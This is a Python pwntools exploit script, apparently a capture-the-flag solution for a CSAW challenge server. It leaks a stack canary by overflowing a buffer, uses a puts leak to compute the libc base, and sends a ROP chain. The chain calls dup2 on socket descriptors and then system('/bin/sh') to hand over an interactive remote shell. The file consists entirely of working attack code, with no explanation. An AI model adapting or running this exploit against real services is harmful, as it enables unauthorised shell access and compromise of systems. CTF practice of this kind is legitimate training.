from pwn import *

offset___libc_start_main_ret = 0x21f45
offset_system = 0x0000000000046590
offset_dup2 = 0x00000000000ebe90
offset_read = 0x00000000000eb6a0
offset_write = 0x00000000000eb700
offset_str_bin_sh = 0x17c8c3
offset_puts = 0x6fd60
offset_dup2 = 0xebe90
main=0x000000000401087
pop_rdi=0x00000000004012e3
pop_rsi_r15=0x00000000004012e1
'''
nc pwn.chal.csaw.io 8002
r=remote('pwn.chal.csaw.io',8002)
gdb-peda$ p puts
$1 = {<text variable, no debug info>} 0x6fd60 <puts>
0x00000000004012e3 : pop rdi ; ret
'''
import sys
local=len(sys.argv)==1
if local:
	r=remote('127.0.0.1',8888)
else :
	r=remote('pwn.chal.csaw.io',8002)
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recv(2)
r.sendline('2')
r.recvline()
r.recv(2)
r.send('A'*313)
r.recvuntil('A'*313)
canary=r.recv(7)
canary='\x00'+canary
print canary.encode('hex')
r.close()

if local:
	r=remote('127.0.0.1',8888)
else :
	r=remote('pwn.chal.csaw.io',8002)
raw_input()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recv(2)
r.sendline('1')
puts_leak=int(r.recvline().split(':')[1],16)+0x500
libc_base=puts_leak - offset_puts
system=libc_base + offset_system
binsh=libc_base + offset_str_bin_sh
print "[+]puts",hex(puts_leak)
print "[+]libc",hex(libc_base)
print "[+]system",hex(system)
print "[+]/bin/sh",hex(binsh)
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.sendline('2')
r.recvline()
r.recv(2)
#r.send('A'*312+canary+'A'*8+p64(pop_rdi)+p64(binsh)+p64(system))
payload = 'A'*312+canary+'A'*8
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(libc_base + offset_dup2)

payload += p64(pop_rdi)
payload += p64(6)
payload += p64(pop_rsi_r15)
payload += p64(1)
payload += p64(0)
payload += p64(libc_base + offset_dup2)

payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
r.send(payload)
r.interactive()